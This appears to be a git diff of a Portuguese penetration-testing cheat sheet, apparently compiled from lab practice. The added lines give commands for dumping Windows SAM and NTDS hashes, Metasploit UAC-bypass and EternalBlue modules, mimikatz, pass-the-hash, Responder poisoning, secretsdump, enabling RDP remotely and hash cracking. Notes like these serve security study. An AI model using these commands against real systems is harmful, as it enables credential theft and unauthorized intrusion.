@@ -1,4 +1,4 @@
-a
+
 
 
 
@@ -660,23 +660,153 @@ impacket-secretsdump -sam <sam> -system <system> LOCAL
 - LM (geralmente termina com `EE`, se  começar com `AA` e terminar com `EE` está em desuso)
 - NTLM = NTLM V1
 - NTLM V2
-obs: se for windows antigo, testar eternalblue
+
 
 **Path for hashes:**
-- C:\Windows\system32\config\SAM                        usuarios windows 7,8,10,11
-- C:\Windows\system32\NTDS\ntds.dit                    usuarios do windows server
-- C:\Windows\system32\config\SYSTEM                 usuarios windows 7,8,10,11
-
-**Cracking hashes:**
 ```
-john --format=nt --wordlist=<wordlist> <hashfile>
+C:\Windows\system32\config\SAM                        usuarios windows 7,8,10,11
+C:\Windows\system32\NTDS\ntds.dit                    usuarios do windows server
+C:\Windows\system32\config\SYSTEM                 usuarios windows 7,8,10,11
+```
+
+Bypass User Account Control (UAC):
+```
+exploit/windows/local/bypassuac_fodhelper
+exploit/windows/local/ask (exige interação com usuário)
+```
+
+windows antigo , testar eternalblue:
+```
+exploit/windows/smb/ms17_010_psexec
+exploit/windows/smb/ms17_010_eternalblue
+```
+
+**Cracking hashes (hashdump)**
+```
 john --format=lm --wordlist=<wordlist> <hashfile>
+john --format=nt --wordlist=<wordlist> <hashfile>
 ```
 
 **hashes da RAM:**
-- /usr/share/windows-binaries/fgdump/fgdump.exe
-- /usr/share/windows-resources/wce/wce-universal.exe
+```
+/usr/share/windows-resources/wce/wce-universal.exe
+/usr/share/windows-binaries/fgdump/fgdump.exe
+```
 
+mimikatz para pegar credenciais
+```
+wdigest
+```
+
+## obtendo shell/ validando usuário
+validando credenciais:
+```
+winexe -U USER%PASS //HOST cmd.exe
+```
+
+```
+sudo crackmapexec smb hosts.txt -d cicada.htb -u <USER> -p <PASS>
+```
+
+```
+exploit/windows/smb/psexec
+
+Em alguns casos vai ter que mudar o target para conseguir shell
+    Id  Name
+    --  ----
+=>  0   Automatic
+    1   PowerShell
+    2   Native upload
+    3   MOF upload
+    4   Command
+
+```
+
+```
+pth-winexe -U bernardo%HASH //HOST cmd.exe
+```
+
+```
+responder -I <interface> -Pbv
+```
+
+ntlmv2 (hashcat 5600 e john netntlmv2)
+```
+hashcat -m 5600 HASH.txt WORDLIST 
+john --format=netntlmv2 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+**dcc2 (hashcat 2100 e john mscash2)**
+```
+hashcat -m 2100 HASH.txt WORDLIST
+john --format=mscash2 hash_secretdump --wordlist=~/wordlist/rockyou.txt
+
+hash formatada:
+$DCC2$10240#thenrique#bffd65356630d9a479f8e6761f56393d
+```
+note que a hash precisa estar corretamente formatada
+
+
+obtendo hashes a partir de um usuário validado
+```
+impacket-secretsdump DOMAIN/USER:PASS@HOST
+```
+
+formatando hash do impacket-secretdump
+```
+hash capturada:
+ORIONSCORP2.LOCAL/thenrique:$DCC2$10240#thenrique#bffd65356630d9a479f8e6761f56393d:
+
+hash formatada:
+$DCC2$10240#thenrique#bffd65356630d9a479f8e6761f56393d
+```
+
+**Habilitando RDP com credenciais validadas:**
+```
+crackmapexec smb HOST -u USER -p PASS -M rdp
+```
+
+## enumeração de usuários do dóminio (AD)
+```
+rpcclient -W WORKGROUP -U USER HOST
+```
+
+enumera os usuarios do dominio
+```
+rpcclient $> enumdomusers
+user:[Administrador] rid:[0x1f4]
+user:[Convidado] rid:[0x1f5]
+user:[DefaultAccount] rid:[0x1f7]
+user:[Usuario] rid:[0x3e9]
+user:[WDAGUtilityAccount] rid:[0x1f8]
+```
+
+enumera os grupos do dominio
+```
+rpcclient $> enumdomgroups 
+group:[None] rid:[0x201]
+```
+
+enumera os membros de um grupo
+```
+rpcclient $> querygroupmem 0x201
+        rid:[0x1f4] attr:[0x7]
+        rid:[0x1f5] attr:[0x7]
+        rid:[0x1f7] attr:[0x7]
+        rid:[0x1f8] attr:[0x7]
+        rid:[0x3e9] attr:[0x7]
+
+```
+
+query pra usuario WDAGUtilityAccount
+```
+queryuser 0x1f8
+```
+
+lista os comandos
+```
+rpcclient $> help
+```
 ## enumeração de usuários
 **enumerar usuários locais**
 ```
@@ -721,7 +851,7 @@ whoami /priv
 whoami /all
 ```
 
-## Remote Desktop Protocol (rdp)
+## Remote Desktop Protocol (rdp port 3389)
 utilitário para interagir com rdp no linux
 ```
 xfreerdp
@@ -849,56 +979,8 @@ não exibe resultados que contenham a frase `Invalid username`
 # hashcat
 
 ```
-hashcat -m <hash_type> -a <attack_mode> <hash_file> <wordlist>
+hashcat -m <hash_type> <hash_file> <wordlist>
 ```
-via de regra eu quero o `-a 0` (ataque de dicionario)
-## Modos de Ataque (`-a`)
-
-1. **Ataque de Dicionário (`-a 0`)**
-    
-    - **Descrição:** Tenta quebrar o hash comparando-o com palavras em uma lista de palavras (wordlist).
-    - **Uso:** `hashcat -m <hash_type> -a 0 <hash_file> <wordlist>`
-    - **Exemplo:** `hashcat -m 0 -a 0 hashes.txt rockyou.txt`
-2. **Ataque de Combinado (`-a 1`)**
-    
-    - **Descrição:** Combina cada palavra de duas listas de palavras e tenta quebrar o hash.
-    - **Uso:** `hashcat -m <hash_type> -a 1 <hash_file> <wordlist1> <wordlist2>`
-    - **Exemplo:** `hashcat -m 0 -a 1 hashes.txt list1.txt list2.txt`
-3. **Ataque de Regras (`-a 3`)**
-    
-    - **Descrição:** Utiliza uma série de regras para modificar cada entrada de uma wordlist. Por exemplo, pode adicionar números ao final, substituir letras, etc.
-    - **Uso:** `hashcat -m <hash_type> -a 0 <hash_file> <wordlist> --rules <rules_file>`
-    - **Exemplo:** `hashcat -m 0 -a 0 hashes.txt rockyou.txt --rules dive.rule`
-4. **Ataque de Máscara (`-a 3`)**
-    
-    - **Descrição:** Gera palavras-chave dinamicamente com base em uma máscara, útil para realizar ataques de força bruta.
-    - **Uso:** `hashcat -m <hash_type> -a 3 <hash_file> <mask>`
-    - **Exemplo:** `hashcat -m 0 -a 3 hashes.txt ?l?l?l?l?l?l?l?l`
-5. **Ataque de Toggle-Case (`-a 4`)**
-    
-    - **Descrição:** Alterna a caixa (maiúsculas e minúsculas) das palavras da wordlist.
-    - **Uso:** `hashcat -m <hash_type> -a 4 <hash_file> <wordlist>`
-    - **Exemplo:** `hashcat -m 0 -a 4 hashes.txt rockyou.txt`
-6. **Ataque de Mask-Generated (`-a 6`)**
-    
-    - **Descrição:** Utiliza uma wordlist e aplica uma máscara ao final de cada palavra.
-    - **Uso:** `hashcat -m <hash_type> -a 6 <hash_file> <wordlist> <mask>`
-    - **Exemplo:** `hashcat -m 0 -a 6 hashes.txt rockyou.txt ?d?d`
-7. **Ataque de Mask-Generated (`-a 7`)**
-    
-    - **Descrição:** Aplica uma máscara ao início de cada palavra em uma wordlist.
-    - **Uso:** `hashcat -m <hash_type> -a 7 <hash_file> <mask> <wordlist>`
-    - **Exemplo:** `hashcat -m 0 -a 7 hashes.txt ?d?d rockyou.txt`
-8. **Ataque de Hybrid Wordlist + Mask (`-a 8`)**
-    
-    - **Descrição:** Utiliza uma combinação de uma wordlist e uma máscara. Isso aplica a máscara tanto no início quanto no final da wordlist.
-    - **Uso:** `hashcat -m <hash_type> -a 8 <hash_file> <wordlist> <mask>`
-    - **Exemplo:** `hashcat -m 0 -a 8 hashes.txt rockyou.txt ?d?d?d`
-9. **Ataque de Hybrid Mask + Wordlist (`-a 9`)**
-    
-    - **Descrição:** Utiliza uma combinação de uma máscara e uma wordlist. Aplica a máscara tanto no início quanto no final da wordlist.
-    - **Uso:** `hashcat -m <hash_type> -a 9 <hash_file> <mask> <wordlist>`
-    - **Exemplo:** `hashcat -m 0 -a 9 hashes.txt ?d?d?d rockyou.txt`
 
 listar exemplos de hashes:
 ```
@@ -919,6 +1001,11 @@ zip2john ~/Downloads/files.zip > hash.txt
 john para quebrar uma hash
 ```
 john --wordlist=~/wordlist/rockyou.txt hash.txt
+```
+
+lista os formatos de hash
+```
+john --list=formats
 ```
 
 ## unshadow
@@ -962,11 +1049,32 @@ enum4linux -a 172.16.1.107
 ```
 # crackmapexec
 ```
+crackmapexec smb <hosts> -u <user> -p <pass> [-x <cmd>]
+```
+
+```
 sudo crackmapexec smb 10.10.11.35 -d cicada.htb -u @users.txt -p '' --shares
 ```
 
+validando credenciais:
+```
+sudo crackmapexec smb hosts.txt -d cicada.htb -u <USER> -p <PASS>
+```
 
-# Active Directory
+
+# Active Directory (AD)
+
+## hashes na rede
+arquivo de configuração
+```
+/etc/responder/Responder.conf
+```
+obs: altera a linha respondTo para incluir apenas os nossos hosts alvo
+
+```
+responder -I eth0 -Prv
+```
+
 ## Relative Identifier (RID)
 O RID é a parte final de um **SID (Security Identifier)**, que identifica de forma exclusiva contas de usuários, grupos ou outros objetos de segurança
 RIDs Comuns em Sistemas Windows
